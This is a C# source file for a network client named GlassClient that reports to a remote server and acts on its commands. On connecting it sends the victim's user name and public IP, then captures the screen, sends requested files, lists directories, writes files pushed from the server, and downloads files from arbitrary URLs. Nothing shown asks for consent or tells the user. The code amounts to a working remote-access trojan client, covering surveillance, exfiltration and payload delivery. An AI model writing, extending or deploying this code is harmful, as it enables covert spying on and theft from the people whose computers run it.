using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace GlassClient
{
    public class GlassConnection
    {
        public string IP { get; private set; }
        public int Port { get; private set; }

        public TcpClient Client { get; private set; }
        public BinaryReader Reader { get; private set; }
        public BinaryWriter Writer { get; private set; }

        public bool Connect(string ip, int port)
        {
            IP = ip;
            Port = port;

            try
            {
                Client = new TcpClient(ip, port);
                Reader = new BinaryReader(Client.GetStream());
                Writer = new BinaryWriter(Client.GetStream());
                return SendIdentify();
            }
            catch
            {
                return false;
            }
        }

        public bool Listen()
        {
            byte type = Reader.ReadByte();

            switch (type)
            {
                case (byte)GlassProtocol.RequestScreen:
                    if (!(SendImageData(TakeScreenshot()))) return false;
                    break;
                case (byte)GlassProtocol.RequestFile:
                    if (!(SendFile(Reader.ReadString()))) return false;
                    break;
                case (byte)GlassProtocol.RequestCurrentDirectory:
                    if (!(SendProtocol(GlassProtocol.SendingCurrentDirectory))) return false;
                    if (!(SendString(Directory.GetCurrentDirectory()))) return false;
                    break;
                case (byte)GlassProtocol.SetCurrentDirectory:
                    Directory.SetCurrentDirectory(Reader.ReadString());
                    break;
                case (byte)GlassProtocol.SendingFile:
                    if (!(ReadFile(Reader.ReadString()))) return false;
                    break;
                case (byte)GlassProtocol.RequestFileDownload:
                    if (!(DownloadFile(Reader.ReadString(), Reader.ReadString()))) return false;
                    break;
                case (byte)GlassProtocol.RequestDirectoryListing:
                    if (!(SendDirectoryListing(Reader.ReadString()))) return false;
                    break;
                case (byte)GlassProtocol.RequestFileListing:
                    if (!(SendFileListing(Reader.ReadString()))) return false;
                    break;
            }
            return true;
        }

        public bool DownloadFile(string uri, string path)
        {
            try
            {
                new WebClient().DownloadFile(uri, path);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool ReadFile(string path)
        {
            try
            {
                StreamWriter file = new StreamWriter(path);
                long length = Reader.ReadInt64();
                for (long i = 0; i < length; i++)
                    file.Write(Reader.ReadByte());
                file.Flush();
                file.Close();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendByte(byte b)
        {
            try
            {
                Writer.Write(b);
                Writer.Flush();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendDirectoryListing(string path)
        {
            try
            {
                if (!(SendProtocol(GlassProtocol.SendingDirectoryListing))) return false;
                string[] dirs = Directory.GetDirectories(path);
                if (!(SendInt(dirs.Length))) return false;
                foreach (string dir in dirs)
                    if (!(SendString(dir))) return false;
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendFile(string filePath)
        {
            try
            {
                if (!(SendProtocol(GlassProtocol.SendingFile))) return false;
                if (!SendLong(new FileInfo(filePath).Length)) return false;
                StreamReader file = new StreamReader(filePath);
                while (file.BaseStream.Position < file.BaseStream.Length)
                    if (!SendByte((byte)file.Read()))
                    {
                        file.Close();
                        return false;
                    }
                file.Close();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendFileListing(string path)
        {
            try
            {
                if (!(SendProtocol(GlassProtocol.SendingFileListing))) return false;
                string[] dirs = Directory.GetFiles(path);
                if (!(SendInt(dirs.Length))) return false;
                foreach (string dir in dirs)
                    if (!(SendString(dir))) return false;
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendIdentify()
        {
            if (!SendProtocol(GlassProtocol.Identify))
                return false;
            if (!SendString(Environment.UserName))
                return false;
            if (!SendString(new WebClient().DownloadString("http://ipinfo.io/ip").Trim()))
                return false;
            return true;
        }

        public bool SendImageData(Bitmap image)
        {
            if (!SendProtocol(GlassProtocol.SendingScreen)) return false;
            if (!SendInt(image.Height)) return false;
            if (!SendInt(image.Width)) return false;
            for (int w = 0; w < image.Width; w++)
            {
                for (int h = 0; h < image.Height; h++)
                {
                    var pixel = image.GetPixel(w, h);
                    if (!SendByte(pixel.R)) return false;
                    if (!SendByte(pixel.G)) return false;
                    if (!SendByte(pixel.B)) return false;
                }
            }
            return true;
        }

        public bool SendInt(int i)
        {
            try
            {
                Writer.Write(i);
                Writer.Flush();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendLong(long l)
        {
            try
            {
                Writer.Write(l);
                Writer.Flush();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendProtocol(GlassProtocol protocol)
        {
            try
            {
                Writer.Write((byte)protocol);
                Writer.Flush();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool SendString(string str)
        {
            try
            {
                Writer.Write(str);
                Writer.Flush();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public Bitmap TakeScreenshot()
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            return bmpScreenshot;
        }
    }
}